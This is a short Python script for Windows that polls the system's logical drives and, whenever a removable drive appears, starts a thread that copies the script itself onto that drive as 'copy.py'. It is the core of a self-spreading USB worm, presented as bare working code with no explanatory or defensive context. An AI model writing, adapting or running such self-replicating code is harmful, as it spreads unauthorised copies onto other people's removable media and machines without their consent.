import win32api, shutil, threading, win32file, os

def usb_(usb_name):
    shutil.copy(__file__, f'{usb_name}copy.py')

def chest(function):
    drive_list = win32api.GetLogicalDriveStrings()
    list_age = drive_list.split("\x00")[0:-1]
    run = 1
    while run:
        drive_list = win32api.GetLogicalDriveStrings()
        drive_list = drive_list.split("\x00")[0:-1]  # the last element is ""
        if list_age != drive_list:
            list_age = drive_list

            for letter in drive_list:
                if win32file.GetDriveType(letter) == win32file.DRIVE_REMOVABLE:
                    t1 = threading.Thread(target=function , args=(letter,))
                    t1.start()


chest(usb_)